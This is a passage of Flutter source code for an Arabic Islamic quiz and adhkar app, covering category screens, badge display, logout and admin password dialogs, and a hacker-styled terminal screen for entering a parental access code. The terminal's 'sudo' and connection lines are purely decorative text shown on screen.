          color: const Color(0xFF8B0000).withAlpha(60),
          width: 1.5,
        ),
        boxShadow: [
          BoxShadow(
            color: const Color(0xFF8B0000).withAlpha(30),
            blurRadius: 15,
            offset: const Offset(0, 5),
          ),
        ],
      ),
      child: Material(
        color: Colors.transparent,
        child: InkWell(
          borderRadius: BorderRadius.circular(20),
          onTap: () => _openQuizCategory(category),
          child: Padding(
            padding: const EdgeInsets.all(20),
            child: Row(
              children: [
                Container(
                  width: 60,
                  height: 60,
                  decoration: BoxDecoration(
                    gradient: const LinearGradient(
                      begin: Alignment.topLeft,
                      end: Alignment.bottomRight,
                      colors: [Color(0xFF8B0000), Color(0xFFDC143C)],
                    ),
                    borderRadius: BorderRadius.circular(16),
                    boxShadow: [
                      BoxShadow(
                        color: const Color(0xFF8B0000).withAlpha(100),
                        blurRadius: 12,
                        offset: const Offset(0, 4),
                      ),
                    ],
                  ),
                  child: const Center(
                    child: Text('📝', style: TextStyle(fontSize: 28)),
                  ),
                ),
                const SizedBox(width: 16),
                Expanded(
                  child: Column(
                    crossAxisAlignment: CrossAxisAlignment.start,
                    children: [
                      Row(
                        children: [
                          Expanded(
                            child: Text(
                              category['name'] ?? '',
                              style: const TextStyle(
                                fontSize: 18,
                                fontWeight: FontWeight.bold,
                                color: Colors.white,
                              ),
                            ),
                          ),
                          // عرض وسام الاختبار المكتمل
                          FutureBuilder<String?>(
                            future: SupabaseService.getUserBadgeForCategory(
                              userId: _currentUser['id'] ?? '',
                              categoryId: category['id'] ?? '',
                            ),
                            builder: (context, snapshot) {
                              if (snapshot.hasData && snapshot.data != null) {
                                return _buildAllBadgeIcons(snapshot.data!);
                              }
                              return const SizedBox.shrink();
                            },
                          ),
                        ],
                      ),
                      if (category['description'] != null &&
                          category['description'].toString().isNotEmpty)
                        Padding(
                          padding: const EdgeInsets.only(top: 4),
                          child: Text(
                            category['description'],
                            style: TextStyle(
                              fontSize: 13,
                              color: Colors.white.withAlpha(120),
                            ),
                            maxLines: 2,
                            overflow: TextOverflow.ellipsis,
                          ),
                        ),
                    ],
                  ),
                ),
                Container(
                  padding: const EdgeInsets.all(8),
                  decoration: BoxDecoration(
                    color: const Color(0xFF8B0000).withAlpha(40),
                    borderRadius: BorderRadius.circular(10),
                  ),
                  child: const Icon(
                    Icons.arrow_forward_ios,
                    color: Color(0xFFDC143C),
                    size: 18,
                  ),
                ),
              ],
            ),
          ),
        ),
      ),
    );
  }

  /// بناء صف من أيقونات الأوسمة المكتسبة - مرتبة حسب الرتبة ومغلفة للتعامل مع الكثرة
  Widget _buildAllBadgeIcons(String badgesString) {
    final rawBadges = badgesString.split(',');
    final List<BadgeType> badges = [];

    for (var b in rawBadges) {
      final type = _getBadgeType(b.trim());
      if (type != null) badges.add(type);
    }

    // ترتيب حسب الرتبة (Enum Index)
    badges.sort((a, b) => a.index.compareTo(b.index));

    return Wrap(
      spacing: 4,
      runSpacing: 4,
      children: badges
          .map((type) => BadgeWidget(type: type, size: 28, showGlow: false))
          .toList(),
    );
  }

  /// مساعد لتحويل النص إلى نوع الشارة
  BadgeType? _getBadgeType(String badgeType) {
    switch (badgeType) {
      case 'bronze':
        return BadgeType.bronze;
      case 'platinum':
        return BadgeType.platinum;
      case 'gold':
        return BadgeType.gold;
      case 'purple':
        return BadgeType.purple;
      case 'hero':
        return BadgeType.hero;
      case 'royal':
        return BadgeType.royal;
      default:
        return null;
    }
  }

  Future<void> _openQuizCategory(Map<String, dynamic> category) async {
    // ✅ تطبيق قيود الزائر
    final canStart = await GuestModeService.requireLogin(
      context,
      'حل الاختبارات',
    );
    if (!canStart || !mounted) return;

    // الانتقال لنمط عرض فئة الاختبارات المختارة
    Navigator.push(
      context,
      MaterialPageRoute(
        builder: (_) => CategoryQuizModeScreen(
          category: category,
          userId: _currentUser['id'],
        ),
      ),
    );
  }

  // صفحة الأذكار - تبويب رقم 2
  Widget _buildAdhkarPage() {
    if (_isLoadingCategories) {
      return Container(
        decoration: const BoxDecoration(
          gradient: LinearGradient(
            begin: Alignment.topCenter,
            end: Alignment.bottomCenter,
            colors: [Color(0xFF0A0E27), Color(0xFF1A1F4E)],
          ),
        ),
        child: const Center(
          child: CircularProgressIndicator(color: Color(0xFFFFD700)),
        ),
      );
    }

    if (_adhkarCategories.isEmpty) {
      return Container(
        decoration: const BoxDecoration(
          gradient: LinearGradient(
            begin: Alignment.topCenter,
            end: Alignment.bottomCenter,
            colors: [Color(0xFF0A0E27), Color(0xFF1A1F4E)],
          ),
        ),
        child: Center(
          child: Column(
            mainAxisAlignment: MainAxisAlignment.center,
            children: [
              Container(
                padding: const EdgeInsets.all(24),
                decoration: BoxDecoration(
                  color: const Color(0xFFFFD700).withAlpha(30),
                  shape: BoxShape.circle,
                  border: Border.all(
                    color: const Color(0xFFFFD700).withAlpha(50),
                    width: 2,
                  ),
                  boxShadow: [
                    BoxShadow(
                      color: const Color(0xFFFFD700).withAlpha(40),
                      blurRadius: 20,
                      spreadRadius: 5,
                    ),
                  ],
                ),
                child: const Text('🕌', style: TextStyle(fontSize: 60)),
              ),
              const SizedBox(height: 24),
              const Text(
                'لا توجد أقسام أذكار متاحة حالياً',
                style: TextStyle(
                  fontSize: 22,
                  color: Colors.white,
                  fontWeight: FontWeight.bold,
                ),
              ),
              const SizedBox(height: 8),
              Text(
                'يتم تحديث قائمة الأذكار حالياً... يرجى المحاولة لاحقاً',
                style: TextStyle(
                  fontSize: 14,
                  color: Colors.white.withAlpha(100),
                ),
              ),
            ],
          ),
        ),
      );
    }

    return Container(
      decoration: const BoxDecoration(
        gradient: LinearGradient(
          begin: Alignment.topCenter,
          end: Alignment.bottomCenter,
          colors: [Color(0xFF0A0E27), Color(0xFF1A1F4E)],
        ),
      ),
      child: Stack(
        children: [
          RefreshIndicator(
            onRefresh: _loadAdhkarCategories,
            color: const Color(0xFFFFD700),
            child: ShaderMask(
              shaderCallback: (Rect rect) {
                return const LinearGradient(
                  begin: Alignment.topCenter,
                  end: Alignment.bottomCenter,
                  colors: [
                    Colors.transparent,
                    Colors.black,
                    Colors.black,
                    Colors.transparent,
                  ],
                  stops: [0.0, 0.05, 0.95, 1.0],
                ).createShader(rect);
              },
              blendMode: BlendMode.dstIn,
              child: ListView.builder(
                padding: const EdgeInsets.all(16),
                physics: const BouncingScrollPhysics(
                  parent: AlwaysScrollableScrollPhysics(),
                ),
                cacheExtent: 1500,
                itemCount: _adhkarCategories.length,
                itemBuilder: (context, index) {
                  final category = _adhkarCategories[index];
                  return RepaintBoundary(
                    child: Container(
                      margin: const EdgeInsets.only(bottom: 14),
                      decoration: BoxDecoration(
                        gradient: const LinearGradient(
                          begin: Alignment.topLeft,
                          end: Alignment.bottomRight,
                          colors: [
                            Color(0xFF8B0000), // لون أحمر غامق جداً
                            Color(0xFFFF0000), // لون أحمر أساسي فاقع
                          ],
                        ),
                        borderRadius: BorderRadius.circular(18),
                        border: Border.all(
                          color: const Color(0xFFFFD700).withAlpha(150),
                          width: 1.5,
                        ),
                        boxShadow: [
                          BoxShadow(
                            color: const Color(0xFFFF0000).withAlpha(40),
                            blurRadius: 12,
                            offset: const Offset(0, 4),
                          ),
                        ],
                      ),
                      child: Material(
                        color: Colors.transparent,
                        child: InkWell(
                          borderRadius: BorderRadius.circular(18),
                          onTap: () {
                            Navigator.push(
                              context,
                              MaterialPageRoute(
                                builder: (_) =>
                                    CategoryViewScreen(category: category),
                              ),
                            ).then((_) => _loadAdhkarCategories());
                          },
                          child: Padding(
                            padding: const EdgeInsets.symmetric(
                              horizontal: 20,
                              vertical: 16,
                            ),
                            child: Row(
                              children: [
                                // أيقونة القسم (افتراضياً رمز مسجد)
                                Container(
                                  width: 48,
                                  height: 48,
                                  decoration: BoxDecoration(
                                    color: Colors.white.withAlpha(30),
                                    borderRadius: BorderRadius.circular(16),
                                  ),
                                  child: const Center(
                                    child: Text(
                                      '🕌',
                                      style: TextStyle(fontSize: 24),
                                    ),
                                  ),
                                ),
                                const SizedBox(width: 16),
                                Expanded(
                                  child: Column(
                                    crossAxisAlignment:
                                        CrossAxisAlignment.start,
                                    children: [
                                      Text(
                                        category['name'] ?? '',
                                        style: const TextStyle(
                                          fontSize: 18,
                                          fontWeight: FontWeight.bold,
                                          color: Colors.white,
                                        ),
                                      ),
                                      Text(
                                        'استكشف الأذكار المتاحة',
                                        style: TextStyle(
                                          fontSize: 12,
                                          color: Colors.white.withAlpha(150),
                                        ),
                                      ),
                                    ],
                                  ),
                                ),
                                Container(
                                  padding: const EdgeInsets.all(8),
                                  decoration: BoxDecoration(
                                    color: Colors.white.withAlpha(30),
                                    borderRadius: BorderRadius.circular(10),
                                  ),
                                  child: const Icon(
                                    Icons.arrow_forward_ios,
                                    color: Colors.white,
                                    size: 16,
                                  ),
                                ),
                              ],
                            ),
                          ),
                        ),
                      ),
                    ),
                  );
                },
              ),
            ),
          ),
        ],
      ),
    );
  }

  void _showLogoutDialog(BuildContext context) {
    showDialog(
      context: context,
      builder: (context) => AlertDialog(
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(16)),
        title: const Text('تسجيل الخروج'),
        content: const Text('هل أنت متأكد من تسجيل الخروج؟'),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context),
            child: const Text('إلغاء'),
          ),
          ElevatedButton(
            onPressed: () async {
              // مسح بيانات الجلسة
              await SessionService.clearSession();
              if (!context.mounted) return;
              Navigator.of(context).pushAndRemoveUntil(
                MaterialPageRoute(builder: (context) => const LoginScreen()),
                (route) => false,
              );
            },
            style: ElevatedButton.styleFrom(
              backgroundColor: Colors.red,
              foregroundColor: Colors.white,
            ),
            child: const Text('تسجيل الخروج'),
          ),
        ],
      ),
    );
  }

  void _showAdminPasswordDialog() {
    final passwordController = TextEditingController();
    bool isLoading = false;
    String? errorMessage;

    showDialog(
      context: context,
      builder: (context) => StatefulBuilder(
        builder: (context, setState) => AlertDialog(
          shape: RoundedRectangleBorder(
            borderRadius: BorderRadius.circular(20),
          ),
          backgroundColor: const Color(0xFF1a1a2e),
          title: Row(
            children: [
              Container(
                padding: const EdgeInsets.all(8),
                decoration: BoxDecoration(
                  color: const Color(0xFF6366F1).withAlpha(50),
                  borderRadius: BorderRadius.circular(10),
                ),
                child: const Icon(
                  Icons.admin_panel_settings,
                  color: Color(0xFF6366F1),
                ),
              ),
              const SizedBox(width: 12),
              const Text('كلمة المرور', style: TextStyle(color: Colors.white)),
            ],
          ),
          content: Column(
            mainAxisSize: MainAxisSize.min,
            children: [
              TextField(
                controller: passwordController,
                obscureText: true,
                style: const TextStyle(color: Colors.white),
                decoration: InputDecoration(
                  hintText: 'كلمة المرور',
                  hintStyle: TextStyle(color: Colors.white.withAlpha(100)),
                  filled: true,
                  fillColor: Colors.white.withAlpha(15),
                  border: OutlineInputBorder(
                    borderRadius: BorderRadius.circular(12),
                    borderSide: BorderSide.none,
                  ),
                  prefixIcon: Icon(
                    Icons.lock,
                    color: Colors.white.withAlpha(150),
                  ),
                ),
              ),
              if (errorMessage != null) ...[
                const SizedBox(height: 12),
                Text(
                  errorMessage!,
                  style: const TextStyle(color: Colors.red, fontSize: 13),
                ),
              ],
            ],
          ),
          actions: [
            TextButton(
              onPressed: () => Navigator.pop(context),
              child: Text(
                'إلغاء',
                style: TextStyle(color: Colors.white.withAlpha(150)),
              ),
            ),
            ElevatedButton(
              onPressed: isLoading
                  ? null
                  : () async {
                      setState(() {
                        isLoading = true;
                        errorMessage = null;
                      });

                      final isValid = await SupabaseService.verifyAdminPassword(
                        passwordController.text,
                      );

                      if (isValid) {
                        if (context.mounted) {
                          Navigator.pop(context);
                          Navigator.push(
                            context,
                            MaterialPageRoute(
                              builder: (context) => const AdminScreen(),
                            ),
                          ).then((_) {
                            // تحديث الصفحة عند العودة من لوحة التحكم
                            _loadActiveTip();
                          });
                        }
                      } else {
                        setState(() {
                          isLoading = false;
                          errorMessage = 'كلمة المرور غير صحيحة';
                        });
                      }
                    },
              style: ElevatedButton.styleFrom(
                backgroundColor: const Color(0xFF6366F1),
                foregroundColor: Colors.white,
                shape: RoundedRectangleBorder(
                  borderRadius: BorderRadius.circular(12),
                ),
              ),
              child: isLoading
                  ? const SizedBox(
                      width: 20,
                      height: 20,
                      child: CircularProgressIndicator(
                        strokeWidth: 2,
                        color: Colors.white,
                      ),
                    )
                  : const Text('دخول'),
            ),
          ],
        ),
      ),
    );
  }
}

/// شاشة تفعيل وضع المطور (تيرمينال) سرية - لن تفتح بشكل عادي
class _TerminalHackerScreen extends StatefulWidget {
  final VoidCallback onComplete;

  const _TerminalHackerScreen({required this.onComplete});

  @override
  State<_TerminalHackerScreen> createState() => _TerminalHackerScreenState();
}

class _TerminalHackerScreenState extends State<_TerminalHackerScreen>
    with SingleTickerProviderStateMixin {
  final List<String> _terminalLines = [];
  final TextEditingController _passwordController = TextEditingController();
  final FocusNode _focusNode = FocusNode();
  final ScrollController _scrollController = ScrollController();
  late Timer _timer;
  int _lineIndex = 0;
  bool _showPasswordField = false;
  bool _isVerifying = false;
  String? _errorMessage;
  late AnimationController _glitchController;

  // نص السطر البرمجي - وضع الهكر
  final List<String> _hackerLines = [
    '\$ sudo ./shadow_init --bypass',
    '[sudo] password for root: ********',
    '',
    '+----------------------------------------------+',
    '¦  SHADOW SYSTEM v3.1.4 - KERNEL LOADED        ¦',
    '+----------------------------------------------+',
    '',
    '\$ loading kernel modules...',
    '  [¦¦¦¦¦¦¦¦¦¦] 100% kernel/core/shadow.ko',
    '  [¦¦¦¦¦¦¦¦¦¦] 100% kernel/net/bypass.ko',
    '  [¦¦¦¦¦¦¦¦¦¦] 100% kernel/crypto/decrypt.ko',
    '',
    '\$ scanning network interfaces...',
    '  eth0: 192.168.1.xxx [CONNECTED]',
    '  wlan0: DISABLED',
    '',
    '\$ establishing secure tunnel...',
    '  Connecting to 45.33.xx.xxx:443...',
    '  [OK] TLS 1.3 handshake complete',
    '  [OK] Certificate verified',
    '',
    '\$ ./access_panel --mode=parental',
    '',
    '+----------------------------------------------+',
    '¦     🛑 PARENTAL CONTROL ACCESS REQUIRED      ¦',
    '+----------------------------------------------+',
    '',
    'Enter access code:',
  ];

  @override
  void initState() {
    super.initState();
    _glitchController = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 100),
    );
    _startTerminalAnimation();
  }

  void _startTerminalAnimation() {
    _timer = Timer.periodic(const Duration(milliseconds: 80), (timer) {
      if (_lineIndex < _hackerLines.length) {
        setState(() {
          _terminalLines.add(_hackerLines[_lineIndex]);
          _lineIndex++;
        });
        // غليتش عشوائي بسيط
        if (_lineIndex % 3 == 0) {
          _glitchController.forward().then((_) => _glitchController.reverse());
        }
        // تمرير للأسفل
        WidgetsBinding.instance.addPostFrameCallback((_) {
          if (_scrollController.hasClients) {
            _scrollController.jumpTo(
              _scrollController.position.maxScrollExtent,
            );
          }
        });
      } else {
        timer.cancel();
        setState(() => _showPasswordField = true);
        _focusNode.requestFocus();
      }
    });
  }

  Future<void> _verifyPassword() async {
    if (_passwordController.text.isEmpty) return;

    setState(() {
      _isVerifying = true;
      _errorMessage = null;
      _terminalLines.add(
        '> ${_passwordController.text.replaceAll(RegExp('.'), '*')}',
      );
      _terminalLines.add('');
      _terminalLines.add('\$ verifying access code...');
    });

    // ?????? ??????
    await Future.delayed(const Duration(milliseconds: 800));

    final isValid = await SupabaseService.verifyParentalCode(
      _passwordController.text,
    );

    if (isValid) {
      setState(() {
        _terminalLines.add('  [OK] Access code verified');
        _terminalLines.add('');
        _terminalLines.add('+----------------------------------------------+');
        _terminalLines.add('¦         ✅ ACCESS GRANTED - WELCOME           ¦');
        _terminalLines.add('+----------------------------------------------+');
        _showPasswordField = false;
      });

      await Future.delayed(const Duration(milliseconds: 1200));

      if (mounted) {
        widget.onComplete();
      }
    } else {
      setState(() {
        _isVerifying = false;
        _terminalLines.add('  [ERROR] Invalid access code');
        _terminalLines.add('  [WARNING] Attempt logged');
        _terminalLines.add('');
        _terminalLines.add('Enter access code:');
        _errorMessage = 'ACCESS DENIED';
      });
      _passwordController.clear();
      _focusNode.requestFocus();

      // إخفاء رسالة الخطأ بعد ثانيتين
      Future.delayed(const Duration(seconds: 2), () {
        if (mounted) setState(() => _errorMessage = null);
      });
    }
  }

  @override
  void dispose() {
    _timer.cancel();
    _glitchController.dispose();
    _passwordController.dispose();
    _focusNode.dispose();
    _scrollController.dispose();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: const Color(0xFF0D0D0D),
      body: SafeArea(
        child: Stack(
          children: [
            // تأثير الخطوط القديمة (CRT effect)
            ...List.generate(30, (index) {
              return Positioned(
                top: (index * 30).toDouble(),
                left: 0,
                right: 0,
                child: Container(height: 1, color: Colors.green.withAlpha(8)),
              );
            }),

            // ????? ???????
            AnimatedBuilder(
              animation: _glitchController,
              builder: (context, child) {
                return Transform.translate(
                  offset: Offset((_glitchController.value - 0.5) * 3, 0),
                  child: child,
                );
              },
              child: Column(
                children: [
                  // ???? ???????
                  Container(
                    width: double.infinity,
                    padding: const EdgeInsets.symmetric(
                      horizontal: 16,
                      vertical: 10,
                    ),
                    decoration: BoxDecoration(
                      color: const Color(0xFF1A1A1A),
                      border: Border(
                        bottom: BorderSide(color: Colors.green.withAlpha(40)),
                      ),
                    ),
                    child: Row(
                      children: [
                        // أزرار التحكم
                        Container(
                          width: 12,
                          height: 12,
                          decoration: BoxDecoration(
                            color: Colors.red.shade400,
                            shape: BoxShape.circle,
                          ),
                        ),
                        const SizedBox(width: 8),
                        Container(
                          width: 12,
                          height: 12,
                          decoration: BoxDecoration(
                            color: Colors.amber.shade400,
                            shape: BoxShape.circle,
                          ),
                        ),
                        const SizedBox(width: 8),
                        Container(
                          width: 12,
                          height: 12,
                          decoration: BoxDecoration(
                            color: Colors.green.shade400,
                            shape: BoxShape.circle,
                          ),
                        ),
                        const SizedBox(width: 20),
                        const Expanded(
                          child: Text(
                            'root@shadow:~ — bash',
                            style: TextStyle(
                              color: Colors.grey,
                              fontFamily: 'monospace',
                              fontSize: 13,
                            ),
                            textAlign: TextAlign.center,
                          ),
                        ),
                        // زر الإغلاق
                        GestureDetector(
                          onTap: () => Navigator.pop(context),
                          child: Icon(
                            Icons.close,
                            color: Colors.grey.shade600,
                            size: 18,
                          ),
                        ),
                      ],
                    ),
                  ),

                  // منطقة التشغيل
                  Expanded(
                    child: SingleChildScrollView(
                      controller: _scrollController,
                      padding: const EdgeInsets.all(16),
                      child: Column(
                        crossAxisAlignment: CrossAxisAlignment.start,
                        children: [
                          // الأسطر الظاهرة
                          ..._terminalLines.map((line) {
                            Color lineColor = const Color(0xFF00FF00);
                            FontWeight weight = FontWeight.normal;

                            if (line.startsWith('[ERROR]') ||
                                line.startsWith('  [ERROR]')) {
                              lineColor = Colors.red;
                            } else if (line.startsWith('[WARNING]') ||
                                line.startsWith('  [WARNING]')) {
                              lineColor = Colors.amber;
                            } else if (line.startsWith('[OK]') ||
                                line.startsWith('  [OK]')) {
                              lineColor = Colors.lightGreenAccent;
                            } else if (line.contains('ACCESS GRANTED')) {
                              lineColor = Colors.greenAccent;
                              weight = FontWeight.bold;
                            } else if (line.contains('+') ||
                                line.contains('¦') ||
                                line.contains('+')) {
                              lineColor = Colors.cyan;
                            } else if (line.startsWith('\$')) {
                              lineColor = Colors.white;
                            }

                            return Padding(
                              padding: const EdgeInsets.only(bottom: 2),
                              child: Text(
                                line,
                                style: TextStyle(
                                  color: lineColor,
                                  fontFamily: 'monospace',
                                  fontSize: 12,
                                  fontWeight: weight,
                                  height: 1.4,
                                ),
                              ),
                            );
                          }),

                          // حقل إدخال كود الدخول
                          if (_showPasswordField && !_isVerifying)
                            Row(
                              children: [
                                const Text(
                                  '> ',
                                  style: TextStyle(
                                    color: Color(0xFF00FF00),
                                    fontFamily: 'monospace',
                                    fontSize: 12,
                                  ),
                                ),
                                Expanded(
                                  child: TextField(
                                    controller: _passwordController,
                                    focusNode: _focusNode,
                                    obscureText: true,
                                    obscuringCharacter: '*',
                                    style: const TextStyle(
                                      color: Color(0xFF00FF00),
                                      fontFamily: 'monospace',
                                      fontSize: 12,
                                    ),
                                    cursorColor: const Color(0xFF00FF00),
                                    decoration: const InputDecoration(
                                      border: InputBorder.none,
                                      isDense: true,
                                      contentPadding: EdgeInsets.zero,
                                    ),
                                    onSubmitted: (_) => _verifyPassword(),
                                  ),
                                ),
                                // مؤشر الإدخال
                                TweenAnimationBuilder<double>(
                                  tween: Tween(begin: 0, end: 1),
                                  duration: const Duration(milliseconds: 500),
                                  builder: (context, value, child) {
                                    return Opacity(
                                      opacity: value > 0.5 ? 1 : 0,
                                      child: const Text(
                                        '¦',
                                        style: TextStyle(
                                          color: Color(0xFF00FF00),
                                          fontFamily: 'monospace',
                                          fontSize: 12,
                                        ),
                                      ),
                                    );
                                  },
                                ),
                              ],
                            ),

                          // حالة التحقق
                          if (_isVerifying)
                            Row(
                              children: [
                                SizedBox(
                                  width: 12,
                                  height: 12,
                                  child: CircularProgressIndicator(
                                    strokeWidth: 2,
                                    color: Colors.green.shade400,
                                  ),
                                ),
                                const SizedBox(width: 10),
                                const Text(
                                  'Verifying...',
                                  style: TextStyle(
                                    color: Colors.green,
                                    fontFamily: 'monospace',
                                    fontSize: 12,
                                  ),
                                ),
                              ],
                            ),
                        ],
                      ),
                    ),
                  ),
                ],
              ),
            ),

            // طبقة رسائل التحذير
            if (_errorMessage != null)
              Positioned(
                top: 80,
                left: 20,
                right: 20,
                child: TweenAnimationBuilder<double>(
                  tween: Tween(begin: 0, end: 1),
                  duration: const Duration(milliseconds: 300),
                  builder: (context, value, child) {
                    return Opacity(
                      opacity: value,
                      child: Transform.translate(
                        offset: Offset(0, -20 * (1 - value)),
                        child: Container(
                          padding: const EdgeInsets.symmetric(
                            horizontal: 20,
                            vertical: 12,
                          ),
                          decoration: BoxDecoration(
                            color: Colors.red.shade900.withAlpha(200),
                            borderRadius: BorderRadius.circular(8),
                            border: Border.all(color: Colors.red.shade600),
                            boxShadow: [
                              BoxShadow(
                                color: Colors.red.withAlpha(50),
                                blurRadius: 20,
                              ),
                            ],
                          ),
                          child: Row(
                            mainAxisAlignment: MainAxisAlignment.center,
                            children: [
                              const Icon(
                                Icons.warning,
                                color: Colors.red,
                                size: 20,
                              ),
                              const SizedBox(width: 10),
                              Text(
                                _errorMessage!,
                                style: const TextStyle(
                                  color: Colors.white,
                                  fontFamily: 'monospace',
                                  fontWeight: FontWeight.bold,
                                ),
                              ),
                            ],
                          ),
                        ),
                      ),
                    );
                  },
                ),
              ),
          ],
        ),
      ),
    );
  }
}
